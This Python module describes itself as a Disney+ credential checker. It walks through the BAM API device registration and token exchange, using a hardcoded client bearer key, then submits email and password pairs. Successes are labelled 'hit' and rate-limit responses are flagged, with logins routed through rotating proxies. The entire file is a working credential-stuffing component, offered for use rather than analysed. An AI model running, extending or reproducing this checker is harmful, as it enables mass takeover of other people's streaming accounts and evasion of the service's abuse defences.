"""
disney.py — Disney+ credential checker module.
"""

import requests
import json
from scripts import get_proxy_dict


def check(email: str, password: str, proxies: list[str] = None) -> dict:
    """
    Check Disney+ credentials via BAM API auth flow.
    Returns {status: 'hit'|'fail'|'error'|'ratelimit', detail: str}
    """
    session = requests.Session()
    proxy = get_proxy_dict(proxies) if proxies else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.disneyplus.com",
        "Referer": "https://www.disneyplus.com/",
    }

    try:
        # Step 1: Get device token
        device_payload = {
            "deviceFamily": "browser",
            "applicationRuntime": "chrome",
            "deviceProfile": "windows",
            "attributes": {}
        }

        device_resp = session.post(
            "https://global.edge.bamgrid.com/devices",
            headers=headers, json=device_payload,
            proxies=proxy, timeout=10
        )

        if device_resp.status_code != 200:
            return {"status": "error", "detail": f"Device reg failed: {device_resp.status_code}"}

        assertion = device_resp.json().get("assertion", "")

        # Step 2: Exchange for access token
        token_payload = {
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "latitude": 0,
            "longitude": 0,
            "platform": "browser",
            "subject_token": assertion,
            "subject_token_type": "urn:bamtech:params:oauth:token-type:device",
        }

        token_headers = {
            **headers,
            "Authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
        }

        token_resp = session.post(
            "https://global.edge.bamgrid.com/token",
            headers=token_headers, json=token_payload,
            proxies=proxy, timeout=10
        )

        if token_resp.status_code != 200:
            return {"status": "error", "detail": f"Token exchange failed: {token_resp.status_code}"}

        access_token = token_resp.json().get("access_token", "")

        # Step 3: Login with credentials
        login_payload = {"email": email, "password": password}
        login_headers = {
            **headers,
            "Authorization": f"Bearer {access_token}",
        }

        login_resp = session.post(
            "https://global.edge.bamgrid.com/idp/login",
            headers=login_headers, json=login_payload,
            proxies=proxy, timeout=10
        )

        if login_resp.status_code == 200:
            body = login_resp.json()
            if body.get("id_token") or body.get("access_token"):
                return {"status": "hit", "detail": "Login successful"}
            else:
                return {"status": "fail", "detail": "No token in response"}

        elif login_resp.status_code == 401 or login_resp.status_code == 400:
            return {"status": "fail", "detail": "Invalid credentials"}

        elif login_resp.status_code == 429 or login_resp.status_code == 403:
            return {"status": "ratelimit", "detail": "Rate limited"}

        else:
            return {"status": "error", "detail": f"HTTP {login_resp.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": "error", "detail": "Timeout"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "detail": "Proxy error"}
    except Exception as exc:
        return {"status": "error", "detail": str(exc)[:60]}
